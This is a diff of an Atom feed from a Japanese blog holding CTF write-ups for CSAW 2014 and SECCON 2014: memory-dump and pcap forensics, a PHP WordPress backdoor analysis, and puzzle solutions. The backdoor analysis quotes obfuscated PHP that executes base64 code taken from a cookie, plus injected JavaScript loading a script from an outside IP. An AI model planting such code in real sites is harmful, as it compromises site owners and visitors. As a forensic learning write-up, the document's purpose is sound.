@@ -4,7 +4,7 @@
   <title><![CDATA[Category: write-up | Hello (forgotten) world]]></title>
   <link href="http://tech.aquarite.info/blog/categories/write-up/atom.xml" rel="self"/>
   <link href="http://tech.aquarite.info/"/>
-  <updated>2014-11-24T07:33:26+09:00</updated>
+  <updated>2014-11-24T07:40:08+09:00</updated>
   <id>http://tech.aquarite.info/</id>
   <author>
     <name><![CDATA[Mei Akizuru]]></name>
@@ -34,9 +34,9 @@
 
 <p>Answer: cd69b4957f06cd818d7bf3d61980e291</p>
 
-<p>与えられるのは'firefox.mem.zip'で、コアダンプです。私が取りかかった時点で既に他のメンバーからbinwalkしてみたらSQLiteのなんかが見えていると報告がありました。Firefoxのコアダンプであれば何か見えててもおかしくないですね。</p>
+<p>与えられるのは&#8217;firefox.mem.zip&#8217;で、コアダンプです。私が取りかかった時点で既に他のメンバーからbinwalkしてみたらSQLiteのなんかが見えていると報告がありました。Firefoxのコアダンプであれば何か見えててもおかしくないですね。</p>
 
-<p>とりあえずstringsで何か見えないかなと思ってstringsの出力結果を'flag'でgrepしてみます。</p>
+<p>とりあえずstringsで何か見えないかなと思ってstringsの出力結果を&#8217;flag&#8217;でgrepしてみます。</p>
 
 <pre><code>(前略)
 etablemoz_annosmoz_annos CREATE TABLE moz_annos (  id INTEGER PRIMARY KEY, place_id INTEGER NOT NULL, anno_attribute_id INTEGER, mime_type VARCHAR(32) DEFAULT NULL, content LONGVARCHAR, flags INTEGER DEFAULT 0, expiration INTEGER DEFAULT 0, type INTEGER DEFAULT 0, dateAdded INTEGER DEFAULT 0, lastModified INTEGER DEFAULT 0)
@@ -61,7 +61,7 @@ ZZZZZZZZZZZZZZTransparent BG enabling flag
 
 <p>Answer: 91e02cd2b8621d0c05197f645668c5c4</p>
 
-<p>与えられる'traffic-5.pcap'をとりあえずWiresharkで見てみます。問題名が'why not sftp?&lsquo;なんだし、きっとFTP通信でなんかやってるだろうと思ってftpとftp-dataでフィルタします。通信を追っていくと&rsquo;/files/zip.zip'をダウンロードしています。当該するdataの方の通信をFollow TCP Streamするとflag.pngとか書いてあるのでまず間違いなさそうです。ftp-dataのパケットからzip.zipを抽出します。</p>
+<p>与えられる&#8217;traffic-5.pcap&#8217;をとりあえずWiresharkで見てみます。問題名が&#8217;why not sftp?&lsquo;なんだし、きっとFTP通信でなんかやってるだろうと思ってftpとftp-dataでフィルタします。通信を追っていくと&rsquo;/files/zip.zip&#8217;をダウンロードしています。当該するdataの方の通信をFollow TCP Streamするとflag.pngとか書いてあるのでまず間違いなさそうです。ftp-dataのパケットからzip.zipを抽出します。</p>
 
 <p>取り出したzip.zipはパスワードも何もかかっていないのでそのまま展開します。するとflag.pngが展開され、それにフラグが書かれていました。</p>
 
@@ -109,7 +109,7 @@ $xhju = $bpzy('', $vyoh($hije("sq", "", $andp.$pvqw.$wfrm.$rhhm))); $xhju();
 
 <ol>
 <li><code>$andp</code>、<code>$pvqw</code>、<code>$wfrm</code>、<code>$rhhm</code>を結合する</li>
-<li>その中の'sq'を取り除く</li>
+<li>その中の&#8217;sq&#8217;を取り除く</li>
 <li>その文字列をBase64デコードする</li>
 <li>その文字列を関数化する</li>
 <li>それを実行する</li>
@@ -132,7 +132,7 @@ if (reset($a) == 'ha' &amp;&amp; $c($a) &gt; 3) {
 
 <p>しかし、ログに記録されてない上にパケットキャプチャもないので、Cookieの中身はわかりません。つまりどんなコードが実行されたのかが全く不明です。データベースの中に何かしら残っていないか探してみましたが見つかりません。ここで一旦手詰まりとなってしまいました。</p>
 
-<p>そこで隣に座ってた某氏が'/var/log/auth.log'を見ていて次の箇所を指摘しました。</p>
+<p>そこで隣に座ってた某氏が&#8217;/var/log/auth.log&#8217;を見ていて次の箇所を指摘しました。</p>
 
 <pre><code>Sep 17 19:20:09 ubuntu sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu/CSAW2014-WordPress/var/www ; USER=root ; COMMAND=/usr/bin/vi /var/www/html/wp-content/themes/twentythirteen/js/html5.js
 </code></pre>
@@ -180,7 +180,7 @@ document.write("&lt;" + m + " " + b + "=" + x + "tp:" + k + k + f + i + "y" + g 
 
 <p>このコードをnodeに与えて、<code>document.write</code>の引数になっている文字列を見てみると次のようになります。</p>
 
-<p>```</p>
+<p>&#8220;`</p>
 
 <script src='http://128.238.66.100/analytics.js'></script>
 
@@ -191,7 +191,7 @@ document.write("&lt;" + m + " " + b + "=" + x + "tp:" + k + k + f + i + "y" + g 
 
 <p>var _0x91fe = [&ldquo;\x68\x74\x74\x70\x3A\x2F\x2F\x31\x32\x38\x2E\x32\x33\x38\x2E\x36\x36\x2E\x31\x30\x30\x2F\x61\x6E\x6E\x6F\x75\x6E\x63\x65\x6D\x65\x6E\x74\x2E\x70\x64\x66&rdquo;, &ldquo;\x5F\x73\x65\x6C\x66&rdquo;, &ldquo;\x6F\x70\x65\x6E&rdquo;];
 window<a href="_0x91fe[0],%20_0x91fe[1]">_0x91fe[2]</a>;
-```</p>
+&#8220;`</p>
 
 <p><code>_0x91fe</code>に代入している箇所をnodeに与えて中身を見てみます。</p>
 
@@ -203,11 +203,11 @@ undefined
   'open' ]
 </code></pre>
 
-<p>これを踏まえた上で先のコードの2行目を見れば、<code>window['open']</code>(<code>window.open</code>関数)で'<a href="http://128.238.66.100/announcement.pdf">http://128.238.66.100/announcement.pdf</a>'を開いていることになります。</p>
+<p>これを踏まえた上で先のコードの2行目を見れば、<code>window['open']</code>(<code>window.open</code>関数)で&#8217;<a href="http://128.238.66.100/announcement.pdf">http://128.238.66.100/announcement.pdf</a>&#8216;を開いていることになります。</p>
 
-<p>&lsquo;<a href="http://128.238.66.100/announcement.pdf">http://128.238.66.100/announcement.pdf</a>'は実際にPDFで、なんかビジュアル系バンドっぽい人物の写真に'I AM HACKING YOU RIGHT NOW'という文が書いてある画像があるだけのPDFです。</p>
+<p>&lsquo;<a href="http://128.238.66.100/announcement.pdf">http://128.238.66.100/announcement.pdf</a>&#8216;は実際にPDFで、なんかビジュアル系バンドっぽい人物の写真に&#8217;I AM HACKING YOU RIGHT NOW&#8217;という文が書いてある画像があるだけのPDFです。</p>
 
-<p>ひとしきりここで爆笑して作業に戻りますと、pdfextractでストリームデータをダンプしてみるように言われました。-sオプションを使ってストリームをダンプします。結果として'stream_{1,2,3,8}.dmp'の4つのファイルが現れます。これらに対してひとまずstringsをしてみます（ていうか先にfileで見てみるべきだったかもしれない）。すると'stream_8.dmp'に何か書かれています。</p>
+<p>ひとしきりここで爆笑して作業に戻りますと、pdfextractでストリームデータをダンプしてみるように言われました。-sオプションを使ってストリームをダンプします。結果として&#8217;stream_{1,2,3,8}.dmp&#8217;の4つのファイルが現れます。これらに対してひとまずstringsをしてみます（ていうか先にfileで見てみるべきだったかもしれない）。すると&#8217;stream_8.dmp&#8217;に何か書かれています。</p>
 
 <pre><code>var _0xee0b=["\x59\x4F\x55\x20\x44\x49\x44\x20\x49\x54\x21\x20\x43\x4F\x4E\x47\x52\x41\x54\x53\x21\x20\x66\x77\x69\x77\x2C\x20\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x20\x6F\x62\x66\x75\x73\x63\x61\x74\x69\x6F\x6E\x20\x69\x73\x20\x73\x6F\x66\x61\x20\x6B\x69\x6E\x67\x20\x64\x75\x6D\x62\x20\x20\x3A\x29\x20\x6B\x65\x79\x7B\x54\x68\x6F\x73\x65\x20\x46\x6C\x75\x66\x66\x79\x20\x42\x75\x6E\x6E\x69\x65\x73\x20\x4D\x61\x6B\x65\x20\x54\x75\x6D\x6D\x79\x20\x42\x75\x6D\x70\x79\x7D"];var y=_0xee0b[0];
 </code></pre>
@@ -243,7 +243,7 @@ undefined
 
 <p>Answer: 3GSE</p>
 
-<p>&ldquo;USENIX workshop CTF"でググると"The Fun and Future of CTF | USENIX"というのが最初に出てきます。このpaperの投稿先が3GSE &lsquo;14でした。</p>
+<p>&ldquo;USENIX workshop CTF&#8221;でググると&#8221;The Fun and Future of CTF | USENIX&#8221;というのが最初に出てきます。このpaperの投稿先が3GSE &lsquo;14でした。</p>
 
 <h1>We don&rsquo;t know either</h1>
 
@@ -267,9 +267,9 @@ undefined
 
 <p>Answer: poopsec</p>
 
-<p>&ldquo;kchung"というのはCSAW CTFの中の人のひとり、Kevin Chung氏。ところがTwitterで@kchungは別の誰かが取っています。彼自身がTwitterで使っている名前が答えなのでTwitterのアカウントを探します。</p>
+<p>&ldquo;kchung&#8221;というのはCSAW CTFの中の人のひとり、Kevin Chung氏。ところがTwitterで@kchungは別の誰かが取っています。彼自身がTwitterで使っている名前が答えなのでTwitterのアカウントを探します。</p>
 
-<p>とりあえず"Kevin Chung"でググってみると同姓同名の人物のプロフィールやら何やらが見つかりますが、その中にcodekevin.comというサイトがあります。これが彼のWebサイトで、ここにTwitterのホームへのリンクがあります。</p>
+<p>とりあえず&#8221;Kevin Chung&#8221;でググってみると同姓同名の人物のプロフィールやら何やらが見つかりますが、その中にcodekevin.comというサイトがあります。これが彼のWebサイトで、ここにTwitterのホームへのリンクがあります。</p>
 ]]></content>
   </entry>
   
@@ -341,7 +341,7 @@ undefined
 
 <h2>解法</h2>
 
-<p>降ってきたファイルの正体は"Standard Triangulated Language"というフォーマットのファイル(参考: <a href="http://ja.wikipedia.org/wiki/Standard_Triangulated_Language">Wikipedia</a>)で、このフォーマットのバイナリ形式で記録された3Dモデルです。このファイルを適切なアプリケーションで開くと3Dモデルを見ることが出来て、そのモデルにフラグが書かれています。</p>
+<p>降ってきたファイルの正体は&#8221;Standard Triangulated Language&#8221;というフォーマットのファイル(参考: <a href="http://ja.wikipedia.org/wiki/Standard_Triangulated_Language">Wikipedia</a>)で、このフォーマットのバイナリ形式で記録された3Dモデルです。このファイルを適切なアプリケーションで開くと3Dモデルを見ることが出来て、そのモデルにフラグが書かれています。</p>
 
 <p>ans: <code>Bar1kaTaLab.</code></p>
 
@@ -351,9 +351,9 @@ undefined
 
 <p>先頭のテキストには意味がないんじゃないかと思って削ってみても、削った後の先頭数バイトが何かのシグネチャになってるわけではありませんでした。あと、前述のnullが続いている箇所がかなり多いことから圧縮されているわけでもなさそうだということはわかりました。</p>
 
-<p>問題名がPrint it!なので、きっと何かにPrintするんだろうと思って、仮想プリンタドライバにlprコマンドでデータを送りつけても何も起きませんでした。他に"Print"に関係しそうなファイルフォーマットを考えてみましたが、たいていがテキスト形式のもので、問題ファイルとは噛み合いません。あとpbcopyでコピーしてコンソールに無理矢理突っ込んだらえらい目にあいました。</p>
+<p>問題名がPrint it!なので、きっと何かにPrintするんだろうと思って、仮想プリンタドライバにlprコマンドでデータを送りつけても何も起きませんでした。他に&#8221;Print&#8221;に関係しそうなファイルフォーマットを考えてみましたが、たいていがテキスト形式のもので、問題ファイルとは噛み合いません。あとpbcopyでコピーしてコンソールに無理矢理突っ込んだらえらい目にあいました。</p>
 
-<p>じゃあテキストに意味があるのだろうと思って削らないままで眺めてみると、先頭のテキスト（＋謎データ）群のサイズがちょうど80bytesでした（"Thanks!&ldquo;で終わっていたので切れ目はわかりやすかった）。80byte、やたらキリがいい。そんな話を@6f70として、じゃあきっと先頭80bytesは何かしらのヘッダーに違いない！　……ということで、先頭80bytesがヘッダになってるようなファイルフォーマットを探すと……</p>
+<p>じゃあテキストに意味があるのだろうと思って削らないままで眺めてみると、先頭のテキスト（＋謎データ）群のサイズがちょうど80bytesでした（&#8221;Thanks!&ldquo;で終わっていたので切れ目はわかりやすかった）。80byte、やたらキリがいい。そんな話を@6f70として、じゃあきっと先頭80bytesは何かしらのヘッダーに違いない！　……ということで、先頭80bytesがヘッダになってるようなファイルフォーマットを探すと……</p>
 
 <p><img src="/images/seccon2014-printit-google.png"></p>
 
@@ -429,7 +429,7 @@ undefined
 
 <p><a href="https://gist.github.com/mayth/f162efa8dc06cd05e5e3">gist</a></p>
 
-<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span> (amida.rb)</span> <a href='/downloads/code/amida.rb'>download</a></figcaption>
+<p><figure class='code'><figcaption><span> (amida.rb)</span> <a href='/downloads/code/amida.rb'>download</a></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
@@ -526,13 +526,13 @@ undefined
 </span><span class='line'>    <span class="k">end</span>
 </span><span class='line'>  <span class="k">end</span>
 </span><span class='line'><span class="k">end</span>
-</span></code></pre></td></tr></table></div></figure></notextile></div></p>
+</span></code></pre></td></tr></table></div></figure></p>
 
 <h2>問題例</h2>
 
 <p><a href="https://gist.github.com/mayth/56bde157140dd52e260c">gist</a></p>
 
-<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>Problem Samples </span></figcaption>
+<p><figure class='code'><figcaption><span>Problem Samples </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
@@ -822,7 +822,7 @@ undefined
 </span><span class='line'> &mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-7
 </span><span class='line'> |     | |  |  |   &lt;br/>
 </span><span class='line'> |     | |  |  |   &lt;br/>
-</span><span class='line'> &mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-8</span></code></pre></td></tr></table></div></figure></notextile></div></p>
+</span><span class='line'> &mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-8</span></code></pre></td></tr></table></div></figure></p>
 ]]></content>
   </entry>
   
